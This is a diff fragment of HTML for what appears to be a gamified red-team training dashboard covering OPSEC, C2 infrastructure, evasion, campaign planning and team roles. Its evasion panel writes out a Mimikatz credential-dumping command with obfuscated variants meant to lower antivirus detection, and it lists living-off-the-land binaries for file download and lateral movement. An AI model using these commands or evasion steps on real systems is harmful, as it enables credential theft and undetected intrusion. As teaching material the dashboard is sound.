+          <button class="btn green-btn mt8" onclick="toggleOpsecVector('infra')" style="font-size:10px;padding:4px 10px">TOGGLE VECTOR</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Pattern Analysis Engine -->
+    <div class="panel">
+      <div class="panel-title">Pattern Analysis Engine</div>
+      <div class="text-xs text-dim mb12">Operational timing heatmap — activity concentration</div>
+      <canvas id="timing-heatmap" width="340" height="160" style="width:100%;border:1px solid var(--border);background:var(--bg0)"></canvas>
+      <div class="mt12 mb8">
+        <div class="flex items-center justify-between mb4">
+          <span class="text-sm">Timing Regularity</span>
+          <span class="tag red">FLAGGED</span>
+        </div>
+        <div class="progress-bar"><div class="progress-fill red" style="width:73%"></div></div>
+        <div class="text-xs text-dim mt4">Mon-Fri 09:00-17:00 UTC — suggests business-hours operator</div>
+      </div>
+      <div class="mb8">
+        <div class="flex items-center justify-between mb4">
+          <span class="text-sm">Geographic Consistency</span>
+          <span class="tag amber">WARNING</span>
+        </div>
+        <div class="progress-bar"><div class="progress-fill amber" style="width:51%"></div></div>
+        <div class="text-xs text-dim mt4">3 unique ASNs detected across sessions — maintain 1 ASN per op</div>
+      </div>
+      <div>
+        <div class="flex items-center justify-between mb4">
+          <span class="text-sm">Behavioral Fingerprint</span>
+          <span class="tag green">NOMINAL</span>
+        </div>
+        <div class="progress-bar"><div class="progress-fill green" style="width:89%"></div></div>
+        <div class="text-xs text-dim mt4">Tool usage patterns consistent with target environment norms</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- OPSEC Failure Scenarios -->
+  <div class="panel mb16">
+    <div class="panel-title">OPSEC Failure Simulation</div>
+    <div class="grid-3">
+      <div class="intel-card" onclick="runOpsecSim('deanon')">
+        <div class="tag red mb8">Scenario A</div>
+        <div class="text-sm mb4">Deanonymization via Email Correlation</div>
+        <div class="text-xs text-dim">Researcher links op persona to personal identity through forum post metadata + email header analysis</div>
+        <div class="mt8 text-xs text-cyan">▸ RUN SIMULATION</div>
+      </div>
+      <div class="intel-card" onclick="runOpsecSim('infra-trace')">
+        <div class="tag amber mb8">Scenario B</div>
+        <div class="text-sm mb4">Infrastructure Trace via ASN Pivot</div>
+        <div class="text-xs text-dim">SOC correlates VPS registration email to previously burned infrastructure cluster</div>
+        <div class="mt8 text-xs text-cyan">▸ RUN SIMULATION</div>
+      </div>
+      <div class="intel-card" onclick="runOpsecSim('timing')">
+        <div class="tag purple mb8">Scenario C</div>
+        <div class="text-sm mb4">Attribution via Operational Timing</div>
+        <div class="text-xs text-dim">Activity windows, tool artifacts, and keyboard patterns create timezone/origin signature</div>
+        <div class="mt8 text-xs text-cyan">▸ RUN SIMULATION</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Terminal output area -->
+  <div class="panel">
+    <div class="panel-title">Operational Log</div>
+    <div class="terminal" id="opsec-terminal">
+      <span class="terminal-line"><span class="t-prompt">OPSEC// </span><span class="t-cmd">initialize --module identity-separation</span></span>
+      <span class="terminal-line"><span class="t-output">  [✓] Compartment Alpha created</span></span>
+      <span class="terminal-line"><span class="t-output">  [✓] Fresh VPN profile loaded — EU-North-1</span></span>
+      <span class="terminal-line"><span class="t-output">  [✓] Browser fingerprint spoofed</span></span>
+      <span class="terminal-line"><span class="t-prompt">OPSEC// </span><span class="t-cmd">check --vectors all</span></span>
+      <span class="terminal-line"><span class="t-output">  Scanning operational vectors...</span></span>
+      <span class="terminal-line"><span class="t-warn">  [!] Personal account crossover detected — CRITICAL</span></span>
+      <span class="terminal-line"><span class="t-output">  [✓] Infrastructure — clean</span></span>
+      <span class="terminal-line"><span class="t-prompt">OPSEC// </span><span class="cursor"></span></span>
+    </div>
+    <div class="flex gap8 mt12">
+      <button class="btn" onclick="awardXP(50); showAlert('OPSEC module assessed. +50 XP awarded.', 'green')">COMPLETE MODULE</button>
+      <button class="btn" onclick="runOpsecScan()">RUN OPSEC SCAN</button>
+    </div>
+  </div>
+</div>
+
+<!-- ============ SECTION 2: INFRASTRUCTURE ============ -->
+<div id="s2" class="section-wrapper">
+  <div class="section-header">
+    <div class="section-num">02</div>
+    <div>
+      <div class="section-title">Attack Infrastructure</div>
+      <div class="section-subtitle">C2 ARCHITECTURE · REDIRECTORS · LAYERED INFRA · TRAFFIC FLOW</div>
+    </div>
+  </div>
+
+  <div class="panel mb16">
+    <div class="panel-title">Tactical Brief</div>
+    <div class="text-sm text-muted" style="max-width:720px">
+      Professional attack infrastructure is layered, resilient, and obfuscated. Operators work through multiple hops — VPNs, redirectors, and cloud proxies — that separate operator identity from C2 servers. If any node is burned, operational continuity is preserved.
+    </div>
+  </div>
+
+  <!-- Infrastructure Topology Visualizer -->
+  <div class="panel mb16">
+    <div class="panel-title">Infrastructure Topology Visualizer</div>
+    <div class="text-xs text-dim mb12">Click nodes to inspect. Animated traffic flows show live beacon traffic.</div>
+    <svg id="infra-svg" class="network-canvas" viewBox="0 0 700 280" height="280">
+      <defs>
+        <marker id="arrowhead" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto">
+          <path d="M0,0 L6,3 L0,6 Z" fill="rgba(0,212,255,0.5)"/>
+        </marker>
+        <marker id="arrowhead-g" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto">
+          <path d="M0,0 L6,3 L0,6 Z" fill="rgba(0,255,136,0.5)"/>
+        </marker>
+        <filter id="glow-filter">
+          <feGaussianBlur stdDeviation="2" result="blur"/>
+          <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
+        </filter>
+      </defs>
+      <!-- Background grid lines -->
+      <line x1="0" y1="140" x2="700" y2="140" stroke="rgba(30,48,72,0.4)" stroke-width="0.5" stroke-dasharray="4,4"/>
+      <line x1="350" y1="0" x2="350" y2="280" stroke="rgba(30,48,72,0.4)" stroke-width="0.5" stroke-dasharray="4,4"/>
+      
+      <!-- Connection lines -->
+      <line id="line-op-vpn" x1="70" y1="140" x2="168" y2="140" stroke="rgba(0,212,255,0.4)" stroke-width="1.5" stroke-dasharray="6,3" marker-end="url(#arrowhead)">
+        <animate attributeName="stroke-dashoffset" from="0" to="-18" dur="1s" repeatCount="indefinite"/>
+      </line>
+      <line id="line-vpn-r1" x1="220" y1="140" x2="278" y2="100" stroke="rgba(0,212,255,0.35)" stroke-width="1.5" stroke-dasharray="6,3" marker-end="url(#arrowhead)">
+        <animate attributeName="stroke-dashoffset" from="0" to="-18" dur="1.2s" repeatCount="indefinite"/>
+      </line>
+      <line id="line-vpn-r2" x1="220" y1="140" x2="278" y2="180" stroke="rgba(0,212,255,0.35)" stroke-width="1.5" stroke-dasharray="6,3" marker-end="url(#arrowhead)">
+        <animate attributeName="stroke-dashoffset" from="0" to="-18" dur="1.4s" repeatCount="indefinite"/>
+      </line>
+      <line id="line-r1-cloud" x1="330" y1="100" x2="398" y2="80" stroke="rgba(0,255,136,0.4)" stroke-width="1.5" stroke-dasharray="6,3" marker-end="url(#arrowhead-g)">
+        <animate attributeName="stroke-dashoffset" from="0" to="-18" dur="1.1s" repeatCount="indefinite"/>
+      </line>
+      <line id="line-r2-cloud" x1="330" y1="180" x2="398" y2="200" stroke="rgba(0,255,136,0.4)" stroke-width="1.5" stroke-dasharray="6,3" marker-end="url(#arrowhead-g)">
+        <animate attributeName="stroke-dashoffset" from="0" to="-18" dur="1.3s" repeatCount="indefinite"/>
+      </line>
+      <line id="line-cloud-c2" x1="462" y1="80" x2="580" y2="130" stroke="rgba(255,179,0,0.5)" stroke-width="2" stroke-dasharray="6,3" marker-end="url(#arrowhead)">
+        <animate attributeName="stroke-dashoffset" from="0" to="-18" dur="0.9s" repeatCount="indefinite"/>
+      </line>
+      <line id="line-cloud2-c2" x1="462" y1="200" x2="580" y2="150" stroke="rgba(255,179,0,0.5)" stroke-width="2" stroke-dasharray="6,3" marker-end="url(#arrowhead)">
+        <animate attributeName="stroke-dashoffset" from="0" to="-18" dur="1.1s" repeatCount="indefinite"/>
+      </line>
+
+      <!-- Nodes -->
+      <!-- Operator -->
+      <g onclick="showNodeInfo('operator')" style="cursor:pointer">
+        <circle cx="70" cy="140" r="28" fill="#0d1117" stroke="rgba(0,212,255,0.6)" stroke-width="1.5" filter="url(#glow-filter)"/>
+        <text x="70" y="135" text-anchor="middle" fill="rgba(0,212,255,0.9)" font-size="16">👤</text>
+        <text x="70" y="152" text-anchor="middle" fill="rgba(0,212,255,0.6)" font-size="8" letter-spacing="1">OPERATOR</text>
+      </g>
+
+      <!-- VPN -->
+      <g onclick="showNodeInfo('vpn')" style="cursor:pointer">
+        <circle cx="194" cy="140" r="24" fill="#0d1117" stroke="rgba(155,89,255,0.6)" stroke-width="1.5"/>
+        <text x="194" y="137" text-anchor="middle" fill="rgba(155,89,255,0.8)" font-size="14">🔒</text>
+        <text x="194" y="152" text-anchor="middle" fill="rgba(155,89,255,0.6)" font-size="8" letter-spacing="1">VPN</text>
+      </g>
+
+      <!-- Redirector 1 -->
+      <g onclick="showNodeInfo('redir1')" style="cursor:pointer">
+        <rect x="280" y="75" width="50" height="50" rx="4" fill="#0d1117" stroke="rgba(0,212,255,0.5)" stroke-width="1"/>
+        <text x="305" y="96" text-anchor="middle" fill="rgba(0,212,255,0.8)" font-size="12">📡</text>
+        <text x="305" y="112" text-anchor="middle" fill="rgba(0,212,255,0.5)" font-size="7" letter-spacing="1">REDIR-1</text>
+        <circle cx="305" cy="75" r="3" fill="rgba(0,255,136,0.8)">
+          <animate attributeName="opacity" values="1;0.2;1" dur="2s" repeatCount="indefinite"/>
+        </circle>
+      </g>
+
+      <!-- Redirector 2 -->
+      <g onclick="showNodeInfo('redir2')" style="cursor:pointer">
+        <rect x="280" y="155" width="50" height="50" rx="4" fill="#0d1117" stroke="rgba(0,212,255,0.5)" stroke-width="1"/>
+        <text x="305" y="176" text-anchor="middle" fill="rgba(0,212,255,0.8)" font-size="12">📡</text>
+        <text x="305" y="192" text-anchor="middle" fill="rgba(0,212,255,0.5)" font-size="7" letter-spacing="1">REDIR-2</text>
+        <circle cx="305" cy="155" r="3" fill="rgba(0,255,136,0.8)">
+          <animate attributeName="opacity" values="1;0.2;1" dur="2.5s" repeatCount="indefinite"/>
+        </circle>
+      </g>
+
+      <!-- Cloud Node 1 -->
+      <g onclick="showNodeInfo('cloud1')" style="cursor:pointer">
+        <rect x="400" y="55" width="62" height="50" rx="4" fill="#0d1117" stroke="rgba(0,255,136,0.5)" stroke-width="1"/>
+        <text x="431" y="76" text-anchor="middle" fill="rgba(0,255,136,0.8)" font-size="12">☁</text>
+        <text x="431" y="92" text-anchor="middle" fill="rgba(0,255,136,0.5)" font-size="7" letter-spacing="1">CLOUD-EU</text>
+      </g>
+
+      <!-- Cloud Node 2 -->
+      <g onclick="showNodeInfo('cloud2')" style="cursor:pointer">
+        <rect x="400" y="175" width="62" height="50" rx="4" fill="#0d1117" stroke="rgba(0,255,136,0.5)" stroke-width="1"/>
+        <text x="431" y="196" text-anchor="middle" fill="rgba(0,255,136,0.8)" font-size="12">☁</text>
+        <text x="431" y="212" text-anchor="middle" fill="rgba(0,255,136,0.5)" font-size="7" letter-spacing="1">CLOUD-AP</text>
+      </g>
+
+      <!-- C2 Server -->
+      <g onclick="showNodeInfo('c2')" style="cursor:pointer">
+        <rect x="572" y="112" width="70" height="56" rx="4" fill="#0d1117" stroke="rgba(255,56,96,0.8)" stroke-width="2"/>
+        <text x="607" y="134" text-anchor="middle" fill="rgba(255,56,96,0.9)" font-size="14">🖥</text>
+        <text x="607" y="150" text-anchor="middle" fill="rgba(255,56,96,0.7)" font-size="8" letter-spacing="1">C2 SERVER</text>
+        <circle cx="607" cy="112" r="5" fill="rgba(255,56,96,0.8)">
+          <animate attributeName="r" values="5;10;5" dur="2s" repeatCount="indefinite" begin="0s"/>
+          <animate attributeName="opacity" values="0.8;0;0.8" dur="2s" repeatCount="indefinite" begin="0s"/>
+        </circle>
+      </g>
+
+      <!-- Labels -->
+      <text x="70" y="178" text-anchor="middle" fill="rgba(0,212,255,0.3)" font-size="7" letter-spacing="1">LAYER 0</text>
+      <text x="194" y="174" text-anchor="middle" fill="rgba(155,89,255,0.3)" font-size="7" letter-spacing="1">LAYER 1</text>
+      <text x="305" y="240" text-anchor="middle" fill="rgba(0,212,255,0.3)" font-size="7" letter-spacing="1">LAYER 2</text>
+      <text x="431" y="240" text-anchor="middle" fill="rgba(0,255,136,0.3)" font-size="7" letter-spacing="1">LAYER 3</text>
+      <text x="607" y="178" text-anchor="middle" fill="rgba(255,56,96,0.3)" font-size="7" letter-spacing="1">LAYER 4</text>
+    </svg>
+
+    <!-- Node info panel -->
+    <div id="node-info-panel" class="mt12 panel" style="display:none;border-color:var(--cyan)">
+      <div class="panel-title" id="node-info-title">Node Details</div>
+      <div id="node-info-content" class="text-sm text-muted"></div>
+    </div>
+  </div>
+
+  <!-- C2 Simulator -->
+  <div class="grid-2 mb16">
+    <div class="panel">
+      <div class="panel-title">C2 Beacon Simulator</div>
+      <div class="text-xs text-dim mb12">Configure beacon interval and jitter</div>
+      <div class="mb8">
+        <label class="text-xs text-dim">Beacon Interval (seconds): <span class="text-cyan" id="beacon-interval-val">45</span></label>
+        <input type="range" min="10" max="300" value="45" step="5" style="width:100%;margin-top:6px" oninput="updateBeaconInterval(this.value)">
+      </div>
+      <div class="mb12">
+        <label class="text-xs text-dim">Jitter (%): <span class="text-amber" id="jitter-val">20</span>%</label>
+        <input type="range" min="0" max="50" value="20" step="5" style="width:100%;margin-top:6px" oninput="document.getElementById('jitter-val').textContent=this.value">
+      </div>
+      <div class="terminal" style="max-height:140px" id="c2-terminal">
+        <span class="terminal-line"><span class="t-output">[T+0:00] Beacon sent — 45B HTTPS/443</span></span>
+        <span class="terminal-line"><span class="t-output">[T+0:45] Beacon sent — 45B HTTPS/443</span></span>
+        <span class="terminal-line"><span class="t-output">[T+1:32] Beacon sent — 53B HTTPS/443</span></span>
+        <span class="terminal-line"><span class="t-success">[T+1:33] CMD received: whoami</span></span>
+        <span class="terminal-line"><span class="t-output">[T+1:33] Response queued</span></span>
+        <span class="terminal-line"><span class="t-prompt">C2// </span><span class="cursor"></span></span>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="panel-title">Infrastructure Resilience</div>
+      <div class="text-xs text-dim mb12">Simulate infrastructure failures and respond</div>
+      <div id="infra-events">
+        <div class="alert-banner" id="infra-alert" style="display:none"></div>
+        <div class="grid-2 mb12">
+          <button class="btn red-btn" onclick="infraFailure('ip-block')">SIMULATE IP BLOCK</button>
+          <button class="btn amber-btn" onclick="infraFailure('redir-loss')">REDIR NODE LOSS</button>
+        </div>
+        <div class="grid-2 mb12">
+          <button class="btn red-btn" onclick="infraFailure('c2-detect')">C2 DETECTED</button>
+          <button class="btn" onclick="infraRecover()">RECOVER INFRA</button>
+        </div>
+        <div id="infra-status">
+          <div class="flex items-center justify-between mb4">
+            <span class="text-xs text-dim">REDIR-1</span>
+            <span class="tag green" id="redir1-status">ONLINE</span>
+          </div>
+          <div class="flex items-center justify-between mb4">
+            <span class="text-xs text-dim">REDIR-2</span>
+            <span class="tag green" id="redir2-status">ONLINE</span>
+          </div>
+          <div class="flex items-center justify-between mb4">
+            <span class="text-xs text-dim">C2-SERVER</span>
+            <span class="tag green" id="c2-status">ONLINE</span>
+          </div>
+          <div class="flex items-center justify-between">
+            <span class="text-xs text-dim">CLOUD-EU</span>
+            <span class="tag green" id="cloud-status">ONLINE</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="flex gap8">
+    <button class="btn" onclick="awardXP(50); showAlert('Infrastructure module assessed. +50 XP', 'green')">COMPLETE MODULE</button>
+  </div>
+</div>
+
+<!-- ============ SECTION 3: EVASION ============ -->
+<div id="s3" class="section-wrapper">
+  <div class="section-header">
+    <div class="section-num">03</div>
+    <div>
+      <div class="section-title">Evasion Concepts</div>
+      <div class="section-subtitle">OBFUSCATION · AV BYPASS · EDR AWARENESS · LIVING OFF THE LAND</div>
+    </div>
+  </div>
+
+  <div class="grid-2 mb16">
+    <!-- Detection vs Evasion Dashboard -->
+    <div class="panel red">
+      <div class="panel-title">Detection Probability</div>
+      <div class="text-xs text-dim mb12">Current behavior profile vs defender detection rules</div>
+      
+      <div class="mb8">
+        <div class="flex justify-between mb4">
+          <span class="text-sm">Static AV Signature</span>
+          <span class="text-xs" id="av-score-txt">HIGH RISK</span>
+        </div>
+        <div class="progress-bar"><div class="progress-fill red" id="av-score-bar" style="width:82%"></div></div>
+      </div>
+      <div class="mb8">
+        <div class="flex justify-between mb4">
+          <span class="text-sm">Behavioral Detection</span>
+          <span class="text-xs" id="edr-score-txt">MEDIUM</span>
+        </div>
+        <div class="progress-bar"><div class="progress-fill amber" id="edr-score-bar" style="width:54%"></div></div>
+      </div>
+      <div class="mb12">
+        <div class="flex justify-between mb4">
+          <span class="text-sm">Network Signature</span>
+          <span class="text-xs text-green">LOW</span>
+        </div>
+        <div class="progress-bar"><div class="progress-fill green" style="width:18%"></div></div>
+      </div>
+
+      <div class="text-xs text-dim mb8">Apply evasion techniques:</div>
+      <div class="grid-2 gap8">
+        <button class="btn" onclick="applyEvasion('obfuscate')">OBFUSCATE</button>
+        <button class="btn" onclick="applyEvasion('encrypt')">ENCRYPT</button>
+        <button class="btn" onclick="applyEvasion('lotl')">USE LOTL</button>
+        <button class="btn" onclick="applyEvasion('pack')">PACK/COMPRESS</button>
+      </div>
+      <div id="evasion-result" class="mt12" style="display:none"></div>
+    </div>
+
+    <!-- Obfuscation Visualizer -->
+    <div class="panel">
+      <div class="panel-title">Obfuscation Visualizer</div>
+      <div class="text-xs text-dim mb8">Code transformation stages → detection score</div>
+      
+      <div class="mb8">
+        <div class="text-xs text-cyan mb4">// Stage 0: Cleartext</div>
+        <div class="terminal" style="max-height:70px;font-size:11px">
+          <span class="terminal-line"><span class="t-error">Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'</span></span>
+        </div>
+        <div class="flex items-center gap8 mt4">
+          <div class="progress-bar" style="flex:1"><div class="progress-fill red" style="width:96%"></div></div>
+          <span class="text-xs text-red">96% detected</span>
+        </div>
+      </div>
+      
+      <div class="mb8">
+        <div class="text-xs text-amber mb4">// Stage 1: String concat</div>
+        <div class="terminal" style="max-height:70px;font-size:11px">
+          <span class="terminal-line"><span class="t-warn">$a='Invoke'+'Mi'+'katz';& $a -Cmd '"sek'+'urlsa::log'</span></span>
+        </div>
+        <div class="flex items-center gap8 mt4">
+          <div class="progress-bar" style="flex:1"><div class="progress-fill amber" style="width:67%"></div></div>
+          <span class="text-xs text-amber">67% detected</span>
+        </div>
+      </div>
+      
+      <div class="mb8">
+        <div class="text-xs text-green mb4">// Stage 2: Base64 + env var</div>
+        <div class="terminal" style="max-height:70px;font-size:11px">
+          <span class="terminal-line"><span class="t-success">$env:ComSpec -replace '.*','';[Convert]::FromBase64String('SW52b2tlLU1pbWlr')|iex</span></span>
+        </div>
+        <div class="flex items-center gap8 mt4">
+          <div class="progress-bar" style="flex:1"><div class="progress-fill green" style="width:22%"></div></div>
+          <span class="text-xs text-green">22% detected</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- EDR Telemetry Simulation -->
+  <div class="panel mb16">
+    <div class="panel-title">EDR Telemetry Simulation</div>
+    <div class="grid-2">
+      <div>
+        <div class="text-xs text-dim mb8">Process behavior events — click to trigger</div>
+        <div class="intel-card red-card mb6" onclick="triggerEDRAlert('mimikatz')">
+          <span class="tag red mb4">HIGH SEVERITY</span>
+          <div class="text-sm mb2">LSASS Memory Access</div>
+          <div class="text-xs text-dim">Process reading LSASS memory — credential theft indicator</div>
+        </div>
+        <div class="intel-card mb6" onclick="triggerEDRAlert('powershell')">
+          <span class="tag amber mb4">MEDIUM SEVERITY</span>
+          <div class="text-sm mb2">Encoded PowerShell Execution</div>
+          <div class="text-xs text-dim">Base64-encoded PS command with network access</div>
+        </div>
+        <div class="intel-card green-card mb6" onclick="triggerEDRAlert('lotl')">
+          <span class="tag green mb4">LOW SEVERITY</span>
+          <div class="text-sm mb2">certutil.exe File Download</div>
+          <div class="text-xs text-dim">Living-off-the-land binary used for file transfer</div>
+        </div>
+      </div>
+      <div>
+        <div class="text-xs text-dim mb8">EDR Alert Stream</div>
+        <div class="terminal" id="edr-terminal" style="max-height:260px">
+          <span class="terminal-line"><span class="t-output">[EDR] Monitoring 1,247 process trees...</span></span>
+          <span class="terminal-line"><span class="t-output">[EDR] Behavioral rules loaded: 8,432</span></span>
+          <span class="terminal-line"><span class="t-prompt">EDR// </span><span class="cursor"></span></span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Living off the Land -->
+  <div class="panel mb16">
+    <div class="panel-title">Living off the Land (LotL) Simulator</div>
+    <div class="text-xs text-dim mb12">Native tools that can perform offensive operations with reduced detection</div>
+    <div class="grid-4">
+      <div class="intel-card" onclick="showLotL('certutil')">
+        <div class="text-sm text-cyan mb4">certutil.exe</div>
+        <div class="text-xs text-dim">Legitimate: Certificate management</div>
+        <div class="text-xs text-amber mt4">Offensive: File download, encoding</div>
+      </div>
+      <div class="intel-card" onclick="showLotL('wmic')">
+        <div class="text-sm text-cyan mb4">wmic.exe</div>
+        <div class="text-xs text-dim">Legitimate: WMI queries</div>
+        <div class="text-xs text-amber mt4">Offensive: Remote exec, lateral movement</div>
+      </div>
+      <div class="intel-card" onclick="showLotL('bitsadmin')">
+        <div class="text-sm text-cyan mb4">bitsadmin.exe</div>
+        <div class="text-xs text-dim">Legitimate: Background transfers</div>
+        <div class="text-xs text-amber mt4">Offensive: C2 comms, file delivery</div>
+      </div>
+      <div class="intel-card" onclick="showLotL('regsvr32')">
+        <div class="text-sm text-cyan mb4">regsvr32.exe</div>
+        <div class="text-xs text-dim">Legitimate: DLL registration</div>
+        <div class="text-xs text-amber mt4">Offensive: AppLocker bypass, DLL exec</div>
+      </div>
+    </div>
+    <div id="lotl-detail" class="mt12" style="display:none"></div>
+  </div>
+
+  <button class="btn" onclick="awardXP(50); showAlert('Evasion module assessed. +50 XP', 'green')">COMPLETE MODULE</button>
+</div>
+
+<!-- ============ SECTION 4: CAMPAIGN PLANNING ============ -->
+<div id="s4" class="section-wrapper">
+  <div class="section-header">
+    <div class="section-num">04</div>
+    <div>
+      <div class="section-title">Campaign Planning</div>
+      <div class="section-subtitle">OBJECTIVES · TIMELINES · DECONFLICTION · MISSION COORDINATION</div>
+    </div>
+  </div>
+
+  <div class="grid-2-1 mb16">
+    <!-- Campaign Timeline -->
+    <div class="panel">
+      <div class="panel-title">Campaign Timeline — Operation DARKFALL</div>
+      <div class="timeline">
+        <div class="timeline-item">
+          <div class="timeline-time">WEEK 01 — RECON</div>
+          <div class="timeline-content">OSINT collection · Target mapping · Attack surface analysis</div>
+          <div class="flex gap8 mt8">
+            <span class="tag green">COMPLETE</span>
+            <span class="tag cyan">PRIMARY PHASE</span>
+          </div>
+        </div>
+        <div class="timeline-item amber">
+          <div class="timeline-time">WEEK 02 — WEAPONIZATION</div>
+          <div class="timeline-content">Payload development · Infrastructure provisioning · Team briefing</div>
+          <div class="flex gap8 mt8">
+            <span class="tag green">COMPLETE</span>
+          </div>
+        </div>
+        <div class="timeline-item amber">
+          <div class="timeline-time">WEEK 03 — DELIVERY</div>
+          <div class="timeline-content">Phishing campaign · Initial access attempts · Foothold establishment</div>
+          <div class="flex gap8 mt8">
+            <span class="tag amber">IN PROGRESS</span>
+            <span class="tag amber">PHASE ACTIVE</span>
+          </div>
+        </div>
+        <div class="timeline-item" style="opacity:0.5">
+          <div class="timeline-time">WEEK 04 — EXPLOITATION</div>
+          <div class="timeline-content">Privilege escalation · Lateral movement · Objective pursuit</div>
+          <div class="flex gap8 mt8">
+            <span class="tag">PENDING</span>
+          </div>
+        </div>
+        <div class="timeline-item red" style="opacity:0.5">
+          <div class="timeline-time">WEEK 05 — OBJECTIVES</div>
+          <div class="timeline-content">Primary objective execution · Evidence collection · Exfiltration</div>
+          <div class="flex gap8 mt8">
+            <span class="tag">PENDING</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Objective Manager -->
+    <div class="panel">
+      <div class="panel-title">Objective Tracker</div>
+      <div class="mb12">
+        <div class="text-xs text-cyan mb8">PRIMARY OBJECTIVES</div>
+        <div id="primary-objectives">
+          <div class="intel-card mb6 green-card">
+            <div class="flex items-center gap8">
+              <span class="text-green" style="font-size:16px">✓</span>
+              <div>
+                <div class="text-sm">Domain Admin Access</div>
+                <div class="text-xs text-dim">Target: corp.domain.internal</div>
+              </div>
+            </div>
+          </div>
+          <div class="intel-card mb6" style="border-color:rgba(255,179,0,0.3)">
+            <div class="flex items-center gap8">
+              <span class="text-amber">⟳</span>
+              <div>
+                <div class="text-sm">Financial Database Exfil</div>
+                <div class="text-xs text-dim">Status: Awaiting access</div>
+              </div>
+            </div>
+          </div>
+          <div class="intel-card mb6" style="opacity:0.5">
+            <div class="flex items-center gap8">
+              <span class="text-dim">○</span>
+              <div>
+                <div class="text-sm">Source Code Repository</div>
+                <div class="text-xs text-dim">Status: Not started</div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="text-xs text-cyan mb8 mt12">SECONDARY OBJECTIVES</div>
+        <div class="intel-card mb6" style="opacity:0.5">
+          <div class="text-sm">Email archive access</div>
+          <div class="text-xs text-dim">CISO + Legal dept mailboxes</div>
+        </div>
+        <div class="intel-card mb6" style="opacity:0.5">
+          <div class="text-sm">Crown jewel documentation</div>
+          <div class="text-xs text-dim">IP, trade secrets, strategy docs</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Deconfliction Simulator -->
+  <div class="panel mb16">
+    <div class="panel-title">Deconfliction Simulator</div>
+    <div class="text-xs text-dim mb12">Verify your traffic doesn't overlap with real attacker activity</div>
+    <div class="grid-3">
+      <div>
+        <div class="text-xs text-cyan mb8">YOUR TRAFFIC LOG</div>
+        <div class="terminal" style="max-height:160px">
+          <span class="terminal-line"><span class="t-output">09:14 POST /api/login [172.16.0.10]</span></span>
+          <span class="terminal-line"><span class="t-output">09:15 GET /admin/users [172.16.0.10]</span></span>
+          <span class="terminal-line"><span class="t-output">09:18 PUT /user/99/role [172.16.0.10]</span></span>
+          <span class="terminal-line"><span class="t-output">09:22 GET /export/csv [172.16.0.10]</span></span>
+        </div>
+      </div>
+      <div>
+        <div class="text-xs text-red mb8">UNKNOWN TRAFFIC LOG</div>
+        <div class="terminal" style="max-height:160px">
+          <span class="terminal-line"><span class="t-warn">09:16 POST /api/login [UNKNOWN IP]</span></span>
+          <span class="terminal-line"><span class="t-error">09:17 GET /.env [UNKNOWN IP]</span></span>
+          <span class="terminal-line"><span class="t-error">09:19 GET /phpmyadmin [UNKNOWN IP]</span></span>
+          <span class="terminal-line"><span class="t-error">09:21 POST /wp-login [UNKNOWN IP]</span></span>
+        </div>
+      </div>
+      <div>
+        <div class="text-xs text-amber mb8">DECONFLICTION RESULT</div>
+        <div id="deconflict-result" class="terminal" style="max-height:160px">
+          <span class="terminal-line"><span class="t-warn">[!] Unknown actor detected</span></span>
+          <span class="terminal-line"><span class="t-error">[!] Scanning for .env files</span></span>
+          <span class="terminal-line"><span class="t-error">[!] WordPress brute-force</span></span>
+          <span class="terminal-line"><span class="t-warn">Verdict: REAL ATTACKER</span></span>
+        </div>
+        <button class="btn mt8" style="width:100%" onclick="runDeconflict()">DECONFLICT</button>
+      </div>
+    </div>
+  </div>
+
+  <button class="btn" onclick="awardXP(50); showAlert('Campaign module assessed. +50 XP', 'green')">COMPLETE MODULE</button>
+</div>
+
+<!-- ============ SECTION 5: TEAM OPS ============ -->
+<div id="s5" class="section-wrapper">
+  <div class="section-header">
+    <div class="section-num">05</div>
+    <div>
+      <div class="section-title">Team Operations</div>
+      <div class="section-subtitle">ROLES · COORDINATION · WORKFLOW SYNCHRONIZATION · INFRASTRUCTURE MAINTENANCE</div>
+    </div>
+  </div>
+
+  <!-- Role Selector -->
+  <div class="panel mb16">
+    <div class="panel-title">Role Selection — Select Your Active Role</div>
+    <div class="grid-4 mb16">
+      <div class="role-card" id="role-lead" onclick="selectRole('lead')">
+        <div class="role-icon">🎯</div>
+        <div class="role-name">Team Lead</div>
+        <div class="role-desc">Mission planning, deconfliction, team coordination</div>
+      </div>
+      <div class="role-card" id="role-operator" onclick="selectRole('operator')">
+        <div class="role-icon">⚡</div>
+        <div class="role-name">Operator</div>
+        <div class="role-desc">Active exploitation, system interaction, objective execution</div>
+      </div>
+      <div class="role-card" id="role-maldev" onclick="selectRole('maldev')">
+        <div class="role-icon">🔧</div>
+        <div class="role-name">Malware Dev</div>
+        <div class="role-desc">Payload development, custom tooling, evasion engineering</div>
+      </div>
+      <div class="role-card" id="role-infra" onclick="selectRole('infra')">
+        <div class="role-icon">🌐</div>
+        <div class="role-name">Infra Admin</div>
+        <div class="role-desc">C2 maintenance, redirector management, VPS provisioning</div>
+      </div>
+    </div>
+
+    <div id="role-console" class="panel" style="display:none;border-color:var(--cyan)">
+      <div class="panel-title" id="role-console-title">Role Console</div>
+      <div id="role-console-content"></div>
+    </div>
+  </div>
+
+  <!-- Coordination Map -->
+  <div class="panel mb16">
+    <div class="panel-title">Team Coordination Map</div>
+    <svg class="network-canvas" viewBox="0 0 700 220" height="220">
+      <!-- Team Lead center -->
+      <circle cx="350" cy="110" r="36" fill="var(--bg2)" stroke="rgba(0,212,255,0.7)" stroke-width="2"/>
+      <text x="350" y="106" text-anchor="middle" fill="rgba(0,212,255,0.9)" font-size="18">🎯</text>
+      <text x="350" y="124" text-anchor="middle" fill="rgba(0,212,255,0.7)" font-size="9" letter-spacing="1">TEAM LEAD</text>
+
+      <!-- Operator left -->
